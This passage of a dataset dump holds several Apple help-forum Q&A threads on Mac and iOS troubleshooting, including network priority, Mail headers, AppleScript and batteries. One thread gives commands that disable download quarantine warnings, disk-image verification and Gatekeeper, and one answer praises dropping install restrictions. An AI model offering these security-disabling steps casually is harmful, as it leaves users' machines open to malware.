service again.\n/usr/local/var/run/httpd/httpd.pid\n\nOne final note, a great resource for using homebrew to get a LAMP environment up and running on OSX is from Andy Miller over on getgrav.org (https://getgrav.org/blog/macos-catalina-apache-multiple-php-versions). Follow those instructions and you're ready to go..\n", "Q: How does a Mac choose between Wi-Fi and Ethernet to work with? My Mac is connected via a 1GBit Ethernet. However, from time to time I do turn on WiFi and let it connect, typically because I need to use AirDrop etc.\nWhen I'm done with AirDrop I usually turn the Wi-Fi off and stay on Ethernet. \nMy thinking is that \"wifi is slower\" and my Mac may use it when downloading or uploading instead of my fast Ethernet. Now I realize this is not based on anything else other than fear.\nIs there truth to my fear? \nIf a Mac has two active connections, Wi-fi, and Ethernet -- what will it choose to use when I'm uploading a large file? Is there a possibility it would choose to use the slower Wifi connection? Or does it employ some kind of algorithm to figure out which one to use based on availability, type and speed? \n\nA: It's possible to set network access interface priority order. Go to System Preferences → Network, click on the lock icon to unlock the preference pane. Now click on the gear icon shown towards the bottom of the network interface list, and select Set Service Order... command.\n\nNow, in the new pane that opens, you can drag the priority network interface (Ethernet in your case) to top.\n\n(I do not have a LAN interface, so the same isn't visible in the screenshot).\n\nA: In a default setup, macOS will prefer the ethernet connection over the WiFi connection automatically. You do not need to fear that you're limiting your network speeds by also connecting to WiFi.\nYou can change the default order by opening System Preferences, select Network, click on the Gear icon below the interface list and select \"Set Service Order\". There you can drag the interfaces to prioritize.\nYou can also list the current order from Terminal.app with:\nnetworksetup -listnetworkserviceorder\n\nAnd change the default order by running the following command:\nnetworksetup -ordernetworkservices <service1> <service2> <service3> <...>\n\nwhere <service1> etc. needs to replaced by the service names listed by the previous command.\nIf you have a slightly more advanced network setup, or are interested in networking - you need to know that the above mentioned answer (and the other answers here) are really a simplification of what actually happens.\nTechnically it is not so that the highest ordered interface is always used for network communication.\nFor example if the WiFi and Ethernet connections really connect to two different IP networks (i.e. two different LANs) - then macOS will route packets destined for local computers over the correct interface - so that computers only accessible through WiFi will be transmitted to over WiFi. This is handled by ordinary IP routing.\nIn addition, if you have a more specific route for a destination (rather than the default gateway) - then it will be routed over that interface instead of the one you have chosen as the top pick in the service order. This can often be the case with VPN software that inserts more specific routes for all or parts of the IP network.\nAlso the simple answer might seem a bit odd if you're familiar with networking on Windows or Linux - as macOS is actually different in this respect. \nOn Windows and Linux the choice of which route to use when there's multiple available at the same specificity, is actually determined by a metric on the route itself. This is different than on macOS where it is determined by a metric (the service order) on the interface.\nAdditionally, macOS actually automatically provides source routing in this case (contrary to other systems). This means that even though you have chosen for example \"Ethernet\" as your top pick, then if another computer contacts yours via the WiFi connection, your Mac will respond via the WiFi connection instead of the Ethernet. Even in the case, where if you had initiated the connection yourself, it would have taken place over Ethernet.\n\nA: It's worth bearing in mind here that any computer will typically favor an Ethernet connection over WiFi, since the speeds advertised on a WiFi connection aren't what you actually get.\nAccess points can only communicate with one device at a time and so basically time slice in order to give the appearance of multi client connectivity. \nSecondly, that communication is only in one direction at a time usually. The radio can either transmit or receive but not both at once (things get a little more complex with MIMO), and so the quoted speed is usually referring to the speed in one direction. That speed advertised is going to be split between sending and receiving.\nTL;DR: Ethernet can do bidirectional full duplex communication. WiFi cannot. WiFi is not Ethernet.\n", "Q: Switch tab in Firefox with swipe left/swipe right gestures I have a MacBook and I'm using Firefox.

I am trying to figure out the possible files that may affect the headers of outgoing emails when using Apple Mail. In particular I want to modify the Reply-To part. \nI know that there are numerous solutions on the web, but apparently each one of the solutions that I have found is still missing some information that would work in my case.\nStraightforward (manual) and terminal-based (automated solution) is the following. Basically the automated is the elegant solution which includes the command defaults write com.apple.mail UserHeaders '{\"Reply-To\" = \"reply-to@address\"; }' The above one is based on the solutions:\n\n\n*\n\n*manual: https://www.lifewire.com/change-reply-to-header-os-x-mail-1172887\n\n*automated: https://www.lifewire.com/add-reply-to-header-os-x-mail-1172899\nHowever, it turns out that in the past the above methods were not really working for me, so I had to follow a different route. (As background info: I was working at an organization where employees would get a strange username by default, something like, jsmit1234 for someone called John Smith, and then I wanted to have a more human-friendly email address in the reply-to part of the email, with something like: john_smith@...) Clearly I am writing this email because by now (4 years later) I can not remember how I did it back then.\nAnyway, another idea is to do factory reset to the Mail app. According to the information found here, under ~/Library/ one should be able to delete the following files/directories:\n(directory) Caches/com.apple.mail --- I can cd and view all the files. I assume I can delete the files as well.\n(directory) Saved Application State/com.apple.mail.savedState --- I can cd into it, but I can not do ls. Interestingly I can not do ls, not even after changing to superuser with sudo su. In fact, if I perform the sudo su while being on the above directory I get the error message: \nshell-init: error retrieving current directory: getcwd: cannot access parent directories: Operation not permitted\n(file) Application Support/AddressBook/MailRecents-v4.abcdmr --- There is however lots of files in the directory AddressBook and there is two more files like the above one, ending in -shm and -wal (where the latter is an SQLite Write-Ahead Log file according to the command file).\n(directory) Containers/com.apple.mail --- I can cd into it, but I can not even perform ls, not even as root.\n(directory) Mail --- I can cd into it, but I can not even performls`, not even as root.\n(file) Preferences/com.apple.mail.plist --- I can view the contents. Interestingly though, there is another file called com.apple.mail-shared.plist under the Preferences directory and I can not view that file with less, not even as root.\n(file) Preferences/com.apple.mail.searchhistory.plist --- There is no such file in my system.\nFor the record I am running macOS Mojave 10.14.6 and the Mail app is version 12.4 (3445.104.11).\nNow, I would really like to avoid doing a factory reset, because this way I would lose about 4 years of emails from my previous organization. So, the question to you is the following: What other files or commands can affect the Reply-To part of the emails? (When I made the change in the past it was another terminal command because the above one did not work as expected even back then.)\nI would appreciate any help on resolving this issue and I want to thank you in advance for your time on thinking about this matter and suggesting solutions.\n\nA: This worked for me: https://www.youtube.com/watch?v=Skwoo8RjHSw\nI deleted com.apple.mail savedState, and moved com.apple.mail and com.apple.MailServiceAgent to the desktop, as the video suggested. After restarting, the Mail App stopped its autocopy that I had set up.\n", "Q: Disable all iOS notifications I have set up an old iPhone 5 for my grandmother (85) which I set up with Apple Configurator to be in single app mode for the phone only.\nI had turned off all the notifications, and made sure that nothing in the background would interfere with the Phone app freezing - due to having an alert that couldn't display but needed action.\nHowever, recently there was an iOS update to 10.3.4 and there are no settings to turn off System notifications. I was wondering if anyone had a fix, or any understanding on disabling notifications for other apps when in single app mode?\n\nA: Until recently the latest version of iOS available for the iPhone 5 was iOS 10.3.3. \niOS 10.3.4 and 9.3.6 were updates for older devices (released at the same time as iOS 12.4) to fix a problem that may cause problems with GPS location performance and/or lead to the system date and time being incorrect. It's only because of the nature of the bug they were fixing that Apple released these updates years after the last update for these older versions of iOS.\nSo, the reason for my explaining all this is that it'd be best to just update the iPhone 5 you gave your grandmother and then the likelihood of another system notification is extremely unlikely (iOS 10.3.3 was release about two years before this one).\nFor more information on this update, refer to: Update your iPhone or iPad software to avoid issues with location, date, and time on Apple's website.\n", "Q: Find file in Time Machine backup with command line I am looking for a specific file starting with \"Screenshot 2019-07-11\" with an unknown location in a Time Machine backup.

I moved my iMac from home into my office and it would not turn on at all there. So I took it around the corner to a repair man and it turned on straight away at his shop. He suggested I get a UPS to see if that makes a difference. So I took it back to my office and tried plugging it into a UPS, but it still did not work. The input / output voltage on the UPS display read 245 volts (I am in Australia where the wall sockets should be somewhere in the range of 230-240V).  I figured that the voltage must be too high for the iMac, since the power at home (where it works fine) is 230-240V as it should be.  So I unplugged the UPS from the wall to run off the battery and the UPS started outputting 230V yet still the iMac wont turn on!\nThere has to be something wrong with my office building because the iMac works fine everywhere else! Is there anything specific to the iMac power supply that could cause this?\n\nA: You can plug the Mac into any voltage from 100 - 240v & it will not care at all, so that's a red herring. \nI'd suggest a mains socket tester plug, to ensure the socket is correctly wired, from the wall & also the UPS.\nAlso, skip the UPS & test the Mac directly in the wall too.

This will ensure that both compilers/linkers will use the same default library search paths, and all behavior should be consistent.\nFor example, the following instructs Open MPI's configure script to use Homebrew's gcc-9 for the C compiler by specifying an absolute path for it (and for the Fortran compiler):\n$ ./configure CC=/usr/local/bin/gcc-9 FC=/usr/local/bin/gfortran ...\n\nNote that this will likely cause configure to not find the Homebrew-installed hwloc, and instead fall back to using the bundled hwloc in the Open MPI source tree.\n\n\n*Alternatively, you can simply force configure to select the bundled versions of hwloc and libevent, which avoids the issue altogether:\n$ ./configure --with-hwloc=internal --with-libevent=internal ...\n\n\n\n*Finally, you can tell configure exactly where to find the external hwloc library. This can have some unintended consequences, however, because it will prefix both the C and Fortran linker's default search paths with /usr/local/lib:\n$ ./configure --with-hwloc-libdir=/usr/local/lib ...\n\nBe sure to also see this FAQ question for more information about using the bundled hwloc and/or Libevent vs. system-installed versions.\n", "Q: AppleScript exit if no action I would like my script to stop automatically unless I press a button.\ndisplay dialog \"Continue\" with icon caution buttons {\"Exit\", \"Continue\"} default button 1 giving up after 2\nif the button returned of the result is \"Exit\" then\n    return\nend if\n\nObviously with the script bellow, I have my default answer selected, I have a time out but at the end of the time out \"Exit\" is not automatically pressed and the script continue.\nIs the only way to do that is to swap the script around like this :\nif the button returned of the result is \"Continue\" then\n    -- add the \"continue script\"\nend if\nReturn \n\n\nA: Negate your 'fail' structure to make it an 'if not pass' instead.\ndisplay dialog \"Continue\" with icon caution buttons {\"Exit\", \"Continue\"} default button 1 giving up after 5\nif the button returned of the result is not \"Continue\" then     \n    return \"exit\"\nelse\n    return \"continue\"\nend if\n\n", "Q: How to change text transparency in the Mac preview? \nThis text is the watermark I want to add.

Automator doesn't include default actions for stuff like that, so you are looking at using a third party action or a script, or doing that part yourself.\nFor an AppleScript solution, create a new service/quick action workflow that receives files or folders in the Finder, and add a Run AppleScript action, replacing the default script with the following:\non run {input, parameters} -- match name of an input item to a videoFolder item\n    set videoFolder to ((path to home folder) as text) & \"Movies:Videos:\" -- the HFS folder path containing matching video files\n    repeat with anItem in the input -- return the first match\n        set {theName, theExtension} to getNamePieces from anItem\n        tell application \"Finder\"\n            set matches to (files of folder videoFolder whose name starts with theName) -- match any extension\n            if matches is not {} then return (first item of matches) as alias\n        end tell\n    end repeat\n    return missing value -- no match\nend run\n\nto getNamePieces from someItem -- get name and extension from a file item\n    tell application \"System Events\" to tell disk item (someItem as text)\n        set {theName, theExtension} to {name, name extension}\n    end tell\n    if theExtension is not \"\" then\n        set theName to text 1 thru -((count theExtension) + 2) of theName -- the name part\n        set theExtension to \".\" & theExtension\n    end if\n    return {theName, theExtension}\nend getNamePieces\n\n...then finish up by adding an Open Finder Items action, and save the workflow.\n", "Q: How to iterate items of the window with dynamic title I am trying to get all rows from a table of the application.\nset ProcName to \"AppName\"\ntell application ProcName to activate\ntell application \"System Events\"\n    tell process ProcName\n        tell tab group 1 of window 1\n            set items to every row of table 1 of scroll area 1\n            set itemValues to {}\n            repeat with aRow in items\n                set itemValue to (value of text field 1 of aRow)\n                log itemValue\n                set the end of itemValues to itemValue\n            end repeat\n        end tell\n\n    end tell\nend tell\n\nHowever when I run the script it prints out only several items because the window title is constantly changing and I get the following error.\n \"System Events got an error: Can’t get window \\\"App name window title\"\n\nIs it possible to tell the script to use other identifiers other than title? \nOr please suggest how to solve the issue.\nThank you.\n\nA: The simplest way is using the Application's bundle identifier.

But, I'm puzzled and wonder what is going on.\nIt's late 2012 MBP 13\" retina (Norwegian keyboard, not that that should matter). My son-in-law noticed that the machine runs a bit warm (80 C all the time) and the battery life is not that good.\nI installed the Intel Power Gadget and found that the machine is running all the time(!) at 2.9 Ghz, independent of load or programs running.\nActivity monitor shows no significant load on the machine; in fact, I quit everything else (except Intel Power Gadget), and the only load worth mention is from IPG and AM, about 3%.\nI've reset the SMC, replaced the battery (not trivial, but it needed a new one), and also refreshed the thermal paste.\nI'm very puzzled. Doesn't a core i5 of 2012 vintage support speed step? The machine is running macOS 10.14.5.\n\nA: The Late-2012 13\" MacBook Pro Retina comes in two variants - one is a 2.5 Ghz i5 CPU, and the other is a 2.9 Ghz i7 CPU. \nIf you have the 2.9 Ghz i7 variant, then this is why your machine is running at 2.9 Ghz.\nThe 2.5 Ghz i5 CPU supports TurboBoost which allows the CPU to boost its frequency from 2.5 Ghz up to a maximum of 3.1 Ghz. In simple terms, the boost is effective only when one of the two cores are busy, but the other is not.

The previous owner said it would connect to some networks, but not others.\nIt connected to my phone hotspot just fine, so I figured the wifi-card isn't actually broken.\nHere at home, I was unable to connect to my router. I tried using wireless diagnostics and one of the things it told me is that there was a conflicting country code. I gather that, for wifi, the Macbook gets its own country code from the first wireless network it sees. The first time I tried, the laptop had the country code 'JP', and was unable to connect. Then, I tried again, and it had the code 'GB', and was also unable to connect. The third time, I sat down next to my own router, and got the code 'NL' and I was able to connect just fine.\nWith my own Macbook Pro this has never been an issue and I have always been able to connect to every wifi network.\nIt seems like the country codes are the issue. Why is the Macbook Air unable to connect to wifi networks of a different country code? Is there something I can do about this, or will this be an issue forever?\n\nA: It is simply not true that the MacBook Air is unable to connect to WiFi networks of a different country code. So - no reason can be given.\nYour observations have lead you to believe that the above mentioned is true, but something else is really at play. One of the things that \"sounds odd\" in your description is that you say that \"GB\" doesn't work, but \"NL\" works perfectly fine. The definition of what GB and NL allows in terms of WiFi is exactly the same - so there's no difference of having a GB or NL country code when connecting to a WiFi network.\nI think you instead have some sort of configuration issue with your Mac. You can try fixing this by opening System Preferences, then click Network and click the \"Location\" drop-down and choose \"Edit Locations\". Now add a new location, and setup your WiFi from scratch with that location.\nTry using that Location and see if that solves your WiFi issues.\n", "Q: How to identify iPad model based solely on Serial Number?

This won’t permanently delete the mail: it will still be accessible on iCloud.com, and in Mail if you switch the option back on.\nThe second option, System Preferences → iCloud → iCloud Drive Options → Mail, controls whether Mail can use iCloud Drive. This is used when you try to send a file that is too large for email; you will be prompted to use Mail Drop, where the attachment is uploaded to iCloud Drive and transferred seamlessly to the recipient.\n", "Q: Can I use a lightning to USB cable to charge an iPhone through an iPad (iPadOS, Pro 9.7)?

Under that level of power use, the battery is having more power go out than what is coming in, so you will lose charge under maximum load even when connected to a charge source, albeit at a slower rate than if it were running on battery alone.\n\nA: Yes, that sounds normal.\nThe cable is only designed to supply so much then the computer takes whatever else it needs from the battery.\nIf the battery is too low and the demand high it will limit the cpu performance...\n", "Q: How to migrate from Windows 7 to Windows 10 double bootcamp boot on Macbook late 2011 - MacOS High Sierra I am running from long time windows 7 on double boot with bootcamp on a Macbook late 2011 i5 with MacOS High Sierra 4Gb mem.\nDue to discontinuation of win 7 support I wish to migrate to win 10.\nI read some similar questions but I get confused and, therefore, I ask for HELP.\nThank a lot\nDino Vitale\n\nA: As per my understanding, If you have a Macbook running a \"genuine\" copy of Windows 7/8/8.1 (properly licensed and activated), you can follow the same steps I did to upgrade it to Windows 10.\nBoot your MacBook from your Windows 7 and carry the steps:\nTo get started, go to the Download Windows 10 webpage and click the Download tool now button. After the download completes, run the Media Creation Tool.\n\nChoose the Upgrade this PC now option and be done with it.\nThen just follow the prompts to complete the upgrade. You will not be asked for a product key, and when the upgrade is complete and you've connected to the Internet, you'll have a digital license to Windows 10, which you can confirm by going to Settings > Update & Security > Activation.\nThe digital license is associated with that specific device, which means you can reformat the disk and perform a clean installation of the same edition of Windows 10 anytime. You won't need a product key, and activation is automatic.\n", "Q: How do I stop Google notification of sport scores on iPhone?

This issue is driving me insane.\n\nA: Reset NVRAM or PRAM on your Mac\nIf your Mac has issues related to settings stored in NVRAM or PRAM, resetting it might help. Sound also comes under this section, so I strongly suggest you to try this as after reboot your MacBook is getting normal.\nHow to reset NVRAM \nShut down your Mac, then turn it on and immediately press and hold these four keys together: Option, Command, P, and R. You can release the keys after about 20 seconds, during which your Mac might appear to restart.\n\n\n\n*\n\n*On Mac computers that play a startup sound, you can release the keys after the second startup sound.\n\n*On Mac computers that have the Apple T2 Security Chip, you can release the keys after the Apple logo appears and disappears for the second time\n\n\nWhen your Mac finishes starting up, you might want to open System Preferences and adjust any settings that were reset, such as sound volume, display resolution, startup disk selection, or time zone.\n", "Q: How to disable major release upgrade in Mojave? I am thinking of not wanting to upgrade from Mojave to Catalina because, so far my setup & configurations of different apps like web-dev stuff and mobile-app development are all working and in proper order. It has taken me a long time to get to this point. Fear of breaking apps - esp 32-bit ones (if any) in the new upcoming version of MacOS has made me think of not going for the upgrade. How / Where do I disable a major release upgrade ?\n\nA: Supplements update are always better to have it and it will come automatically under Software Update if you press Check for update. You can choose whether to install it or not. \nHowever, you will never get Catalina from Software Update if you are running Mojave. Catalina will be available in macOS store later as Apple has done for past OS. Later you download it if you want to install else for the whole year, Apple will never force to update you from running OS to a new OS. It's totally up to you. \n\nA: To ignore all updates that start with \"macOS Catalina\":  \nsudo softwareupdate --ignore \"macOS Catalina\"\n\nTo reset all ignored updates:\nsudo softwareupdate --reset-ignored\n\nSource\nFor more details, check out man softwareupdate:\n     --ignore identifier ...\n                 Manages the per-machine list of ignored updates. The\n                 identifier is the first part of the item name (before the\n                 dash and version number) that is shown by --list.  See\n                 EXAMPLES.\n\nUnfortunately, this does not ignore only major releases to the best of my knowledge, but it will stop the nags until disabled.

But now, I have a separate folder that always lives in the same location, with some formats that I need to place inside those newly created folders, and hopefully rename them (later).\nI can Get Specified Finder Items to locate the first format, but when I want to Copy that Finder Item to the folders, I encounter that all those paths to the folders I created dynamically cannot be accessed, because the Copy Finder Items TO: does not take existing variables, only new ones.\nSo, can I save those paths somehow and then pass them to the recipient folder? It's the same when renaming. I can only pass text to the dialog box, not a variable that I just created.\nAny ideas?\n\nA: From the Copy Finder Items \"To:\" menu, select \"New Variable\" and give it an appropriate name. Then after that, you can use the Set Value of Variable to set the value of the newly created variable. Note that you must do this above your Copy Finder Items action so that the variable is set before the copy operation happens.\nExample workflow:\n\n", "Q: Applescript and SpeechRecognitionServer: reading in a file as \"listen for\" In place of the list in\ntell app \"SpeechRecognitionServer to set theQueryList to listen for {\"list item 1\", \"list item 2\"...}\n\nI'd like to read in a text file that contains the list.

How do I check country of origin for apps in the iOS App Store? My experience is that looking for the listed developer isn't always accurate and the App Store doesn't appear to show country of origin.\nMy current practices for estimating country of origin for security purposes:\n\n\n*\n\n*Check for \"Engrish\": extremely broken grammar associated with automatic translation tools. Most Chinese knockoff apps have \"Engrish\" descriptions. However, bear in mind that broken grammar doesn't always mean \"software from China\" - it's common to have this happen with apps from Asia in general. \n\n*Developer or vendor appears to have a Chinese or Russian name. In these cases I usually do an additional Google search to verify this. Taiwan uses the same language as China (although their character sets are written differently) - another thing to check so I don't incorrectly flag Taiwanese apps as coming from China.\n\n*Check the developer's other apps. What languages and countries do they appear to be geared towards? If I see anything geared towards China or Russia, I usually reject the developer.\n\n*Check the listed language availability. Generally, an app that offers only English and Simplified (not Traditional/Taiwanese) Chinese is a telltale sign that it comes from China.\n\n*Online search (background check) for the developer. This often fails in the case of apps designed by extremely small teams or independent developers.\n\n\nHere's a list of things that often go wrong when pinpointing where an app comes from:\n\n\n*\n\n*Publisher or developer uses a front company outside their country to mask country of origin. I remember a recent instance of this where a Russian publisher opened a front company in Ireland and listed that.\n\n*Search turns up no results. A lot of app developers are small independent software companies with no name recognition, and many don't have a dedicate website or show up on search results.\n\n*Listed developer (below the app name) doesn't match the listed seller. In some cases, the listed seller is obviously a joke or incorrect. I recall one app where the seller was listed as \"Michael Jackson\", even though that clearly was not the developer's name.\n\n\nIs there a better way to do this?\n\nA: You are not safer in the Appstore than anyware else: the only thing that is scrutinized by Apple is how the app works correctly in OS and that it works only in the api (which already is a good direction) but it can still be a bad app.\n\nA: I was having the same concern and, like you, I searched for app developers' info on the Internet for every app I downloaded, but this method is wayyyyy too troublesome. Then I stumbled upon a website called crunchbase (crunchbase.com) where you can search for app developers' registered company info (including the country that the company registered at) of many apps.

I have 3rd generation iPad pro. I use USB-C to HDMI adapter to connect my iPad to an external monitor with speaker.\nThe speaker on the monitor is so bad..I would love to use iPad speaker instead. \nI've looked up everywhere, but it looks like there is no way to disable audio out to HDMI.\nIs there a way to turn off HDMI audio out?\n\nA: Unfortunately not. As far as iOS is concerned, HDMI works at the device level, and responds according to the EDID of the display device - if the display announces via its EDID it handles audio as well, then the iPad will switch audio over to the display device, in accordance with HDCP and the HDMI spec.\n\nA: I’m using an iPad Pro 12.9” 3rd gen. I’ve found that I have the same behavior. I was able to manually switch the audio by going to control center, tap the audio sharing button and then select the built-in speakers or other connected device. I use my wireless headphones.

I have downloaded a dmg file but when I click on it it keeps verifying. \nI've also tried to go to /System/Library/CoreServices/Installer.app but I can't click on the .dmg because it is greyed out.\nHow can I open it?\n\nA: The verification is used to make sure the .dmg package is not corrupted. You had better wait for the verification to be done, since the likely situation is that your file is bad, not that the check can’t run.\nIf you really wanna skip the verification, execute the following commands in the Terminal,\n# Disable the \"Are you sure you want to open this application?\" dialog\ndefaults write com.apple.LaunchServices LSQuarantine -bool false\n\n# Disable Disk Image Verification: Verifying ...\ndefaults write com.apple.frameworks.diskimages skip-verify -bool true\ndefaults write com.apple.frameworks.diskimages skip-verify-locked -bool true\ndefaults write com.apple.frameworks.diskimages skip-verify-remote -bool true\n\nTo reverse the settings,\ndefaults delete com.apple.LaunchServices LSQuarantine -bool false\n\n\ndefaults delete com.apple.frameworks.diskimages skip-verify\ndefaults delete com.apple.frameworks.diskimages skip-verify-locked\ndefaults delete com.apple.frameworks.diskimages skip-verify-remote\n\nReferences\n\n*\n\n*Disable open diaglog\n\n*Awesome macOS Command Line\n\nA: The command line tools allow you to mount the DMG and skip verification.\nOpen Terminal:\nhdiutil attach -noverify /Path/To/Your/DMGFile.dmg\n\nIf you have the DMG file on your Desktop, and the DMG was named \"Broken.DMG\" you could type in something like this:\nhdiutil attach -noverify ~/Desktop/Broken.dmg\n\nRather than typing the name of the file, just drop the file icon in the terminal window once the main command is ready. If your image is bad, the warning is correct and you should get a new dmg rather than bypass the error checking step.\n\nA more global change would use defaults, but this check is very handy in general since it flags bad images:\ndefaults write com.apple.frameworks.diskimages skip-verify TRUE\n\nThis will stop the verification of DMG files permanently. After you've managed to skip the verification and open that file, it would be a good idea to re-enable the verification by opening Terminal again and typing in:\ndefaults write com.apple.frameworks.diskimages skip-verify FALSE\n\n\nA: An alternate to the other answers (which don't work in all cases) is to turn off gatekeeper. This lets you open a dmg without the annoyingly slooooow verify step.\nThis has the additional benefit (in my opinion) of removing the restriction on what apps you can install. Of course there is a risk if you aren't careful, but hey, its my/ your computer, so up to me/you if you want to take the risk.....\nSo the terminal command to turn off gatekeeper is\nsudo spctl --master-disable\n\nto re-enable if you want\nsudo spctl --master-enable\n\nCheck status by\nspctl --status\n\nAddendum: For some reason, even with gatekeeper turned off, verify still occurs on some (not all!) dmgs that I have loaded down from websites - but there doesn't seem to be a pattern - different dmgs from the same website - one will verify, the other skip the verify and go straight to mounting. All the dmgs that I have created for my data open without verifying. Intriguing......\n\nA: FastDMG\nFastDMG is a free app available from https://sveinbjorn.org/fastdmg which I have used for this for a long time.¹ It’s very convenient, and if the .dmg is corrupted, it won’t mount, so that will be the sign that something might be wrong. Also, if FastDMG does fail to mount a .dmg for some reason, it will offer to send it to the default macOS Disk Image Mounter.\n¹ Because this is the Internet, allow me to add: “YMMV.

Hello I'm using a mid 2015 MBP. \nMy battery lasts 1-2 hours now, I got this text Condition: Replace Soon on the battery icon.\nOther stuff are my computer sometimes heats up, gets really slow and fans start working extra hard while working on basic stuff, like running Chrome. I have to close the lid, let it rest a bit then continue where I left off. \nCould this have anything to do with battery or could it be something else? \nI'm a developer and I need a lot of software open at all times without my computer lagging on me. But I also do not prefer to get one of the new macbooks if a simple battery change will fix this problem.\nSo is battery condition the reason for poor MBP performance? \n\nA: In addition to what jksoegaard has stated in their answer, there are a couple of things you should do that may help in the short-term until you can replace your battery.\n1. Reset the SMC\nFor starters, I would reset the System Management Controller (SMC) as that is key to your MBP's power management. To reset the SMC on your model MBP, follow these steps:\n\n\n*\n\n*Fully shut down your MBP \n\n*Press and hold the Shift-Control-Option keys on the left side of your built-in keyboard while also pressing the power button and keep them all down for at least 10 seconds\n\n*Let go of all keys and the power button\n\n*Switch on your MBP\n\n\n2. Disable hardware acceleration on Google Chrome\nDisabling hardware acceleration on Google Chrome will reduce the power demands on your MBP. To do this:\n\n\n*\n\n*Go to Chrome > Preferences\n\n*Scroll down to the bottom\n\n*Click on Advanced\n\n*Scroll down to the System heading\n\n*Disable the Use hardware acceleration when available option\n\n\nA final word\nThe above steps will not change the fact that you need to replace your battery. While jksoegaard is correct that The source of the heating up might also be something else entirely, it is highly likely the battery situation is at least contributing to this, if not the only cause.\nAs your MBP heats up the SMC will kick in to ensure that your MBP is protected from damage, so the SMC will do things like slow down your CPU, increasing your fan speeds, etc. Resetting the SMC may help in this, but replacing your battery will have a big impact.\n\nA: Definitely yes\nI got the battery replaced (and the dust cleaned up) on a mid-2014 MBP a week ago. From that moment, the fans are way slower and the performance has improved significantly.\nThe laptop had the same symptoms as you are reporting.\nWhat is really execrable is that you will have to pay for the whole bottom chassis, given that Apple glues the battery on that thing and Apple-sanctioned support centers will refuse to simply unglue it and replace the battery separately (like all other repair shops would do).\n\nA: When the condition of a battery is labeled as Replace Soon, it means that the battery is consumed. This means that it's used up it's allotted full-charge cycles (1,000). A battery that is consumed doesn't mean that something is physically wrong with the battery, it's just depleted, but this can cause abnormal amounts of heat. Abnormal amounts of heat will cause the fans to spin up, and your performance to falter as your machine is trying to throttle the cpu to keep the core cooler. \nAlthough it would be wise to reset the SMC once you have a battery replacement, doing so without a battery replacement won't do anything for a consumed battery.\nThe longer you run your battery like this, you might start experiencing unexpected shutdowns, short battery life, abnormal/excessive heat, etc. I would highly recommend getting the battery replaced. This will avoid the potential of battery cells swelling, which can cause damage to internal components, trackpad, keyboard, and other things.\n\nA: The bad battery may be the effect and not the cause\nLithium battery life is reduced by heat.  In a tightly-packed chassis like a Macbook, there isn't much spare space, so when the CPU heats up so does the battery.  If the machine is running hot a lot of the time, the battery will be under stress a lot of the time and potentially degrading faster.  It may be that there's some other reason why your machine is running hot, and the bad battery is a symptom and not the root cause.\nTo this end, I'd start by going to the taskbar battery icon and looking in the menu for apps 'Using Significant Energy'.  Also Activity Monitor has an Energy tab.  I'd try and use Activity Monitor to work out what's causing your machine to work hard and why it's getting hot.  Unless you're charging or discharging heavily, or there's a serious fault, the battery itself shouldn't be getting hot of its own accord.\n\nA: Yes, it could have something to do with the battery - and yes, it could be something else. In short, it's not possible to know without examining your actual hardware.\nThe \"Replace Soon\" warning combined with the fact that the battery lasts only for 1 hour really means that you should get the battery replaced. It is not going to get better by itself. Nor is unusual - getting 4.5 years of life out of a battery is actually quite good.\nIf the battery problem causes extra heat - either from the battery itself, charging circuits or elsewhere - it might be the source of your computer heating up.\nThe source of the heating up might also be something else entirely. For example it could be as simple as a broken or very dirty fan. Replacing the fan could fix the problem.\n", "Q: Bash: Elegant ways to use multiple variables for shortening long strings?

I would like to completely turn off the screen rendering on my Mac for some time as I have some processes running in the background but I don't need to use the monitor. I'm expecting that this measure will save some battery consumption, but that's beyond the goal of this post.\nI've been using Control + Shift + Fn + Power Button to sleep the display. The problem is that the background processes stop running.\nHow can I keep my background processes running but display nothing on the screen?\nI'm using a Macbook Air if it makes a difference.\n\nA: I could be missing something in your post, but you should be able to set your Energy Saver preferences so that your display goes to sleep, but your computer doesn't.\nSince you haven't specified the exact version of macOS you're running I can't give you step by step instructions or include a screenshot, but essentially you need to go to Apple > System Preferences > Energy Saver.\nIf you take a look there you should see you can set your display to go to sleep at a certain point and your computer to go to sleep at another point in time (or never, if that's what you need).\nDoing so will save you on battery power as your display is asleep, but of course your MBA is still running otherwise.\nIf you're going to have your MBA plugged into an AC power source when you need the processes to run you'll need to ensure your settings are configured on the Power Adapter tab (as opposed to the Battery tab). Likewise, you'll need to set your Battery tab settings appropriately if you're also going to be running these process while running off the battery.\nYou'll also see other settings here (depending on your Mac and version of macOS), so you may want to familiarise yourself with the Use the Energy Saver settings on your Mac page on Apple's website.\n\nA: You can use a Hot Corner to sleep just the display.\nGo to the Mission Control prefpane and click the 'Hot Corners…' button. Choose a corner and select 'Put Display to sleep'. Now, when you move the mouse-pointer into that corner of your primary display, the display(s) will turn off, leaving the rest of the machine active.\nI'm not sure if you can assign a keyboard shortcu to this action, though, but this is a quick, tried-and-true Apple-provided mechanism for achieving what you want.\n\nA: Use control + command + Q to lock the screen, then press esc to turn the screen off.\n", "Q: How can I save Keynote presentations as an auto-playing slideshow? In MS PowerPoint users can save their presentations as a PowerPoint Show instead of a PowerPoint Presentation. \nBesides changing the file extension from .pptx to .ppsx, this option means that upon opening the file it will automatically open in Slideshow mode rather than the typical PowerPoint editing mode. It also means the Slideshow can start playing automatically, so that it moves from slide to slide without user input (if it's been designed to do that).\nIs there a similar feature in the Keynote app for macOS? If so, how do I use it?\n\nA: The way this is done with Keynote is somewhat different to the PowerPoint approach.\nInstead of having to save the presentation as a different file, you only need to change your presentation's settings within the Inspector.\nAssuming you're talking about the latest version of Keynote on macOS, follow these steps:\n\n\n*\n\n*Open your presentation in Keynote\n\n*Click on the Document icon at top right of the toolbar\n\n*Under Slideshow Settings, tick the Automatically play upon open checkbox\n\n*In the Presentation Type drop-down menu,  select Self-Playing\n\n*Now save your presentation\n\n\nNow when you open it up it'll automatically play in presentation mode.\nNOTE: Obviously you can play with these settings if you'd like to achieve a different outcome.\n", "Q: Shutdown prompt keeps popping up I have a weird problem. Recently, I have noticed whenever I connect my MacBook Pro to my screen, the shutdown prompt (see picture) pops up and no matter how many times I click on \"Cancel\" it keeps popping up. It even steals the screen attention (that window gets highlighted) meaning that I'm not able to do anything at all.\nUsually, it stops after a while (like 10 minutes or more), but it is nondeterministic.\nI have a theory about what can be the cause. The screen I have is one of these old Apple Cinema displays (maybe ten years old), and it has a power button (touch-based) on it. I think it must be related to this. Somehow it feels as if the button is continuously getting pressed. In the Display preferences, there is an option related to the button. It's already set to \"Does nothing\" but the problem still occurs. I tried changing it to \"Turns the display on and off\", and the display started blinking, constantly turning on 